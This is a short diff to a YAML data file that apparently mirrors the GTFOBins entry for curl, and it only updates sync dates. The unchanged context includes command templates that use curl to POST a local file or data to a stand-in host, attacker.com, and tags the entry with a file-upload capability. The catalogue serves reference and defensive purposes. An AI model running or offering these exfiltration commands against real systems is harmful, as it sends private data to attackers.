@@ -13,7 +13,7 @@ sources:
   upstream_url: https://gtfobins.github.io
   license: GPL-3.0
   upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
-  last_synced: '2026-11-14'
+  last_synced: '2026-11-16'
 commands:
 - template: curl -X POST --data-binary @/path/to/input-file http://attacker.com
 - template: curl -X POST --data-binary DATA http://attacker.com
@@ -80,7 +80,7 @@ source_data:
               receiver: tcp-server
     upstream_url: https://gtfobins.github.io/gtfobins/curl/
     upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
-    last_synced: '2026-11-14'
+    last_synced: '2026-11-16'
 enrichment:
   capabilities:
   - value: file-upload
@@ -116,6 +116,6 @@ enrichment:
 _meta:
   schema_version: 1
   generated_by: loldex-projection
-  projected_at: '2026-11-14'
+  projected_at: '2026-11-16'
   source_hashes:
     GTFOBins: sha256:cfc76f18e199139e92c6dbe046c7058e71aca56548ac2f7fd8749480fccde648
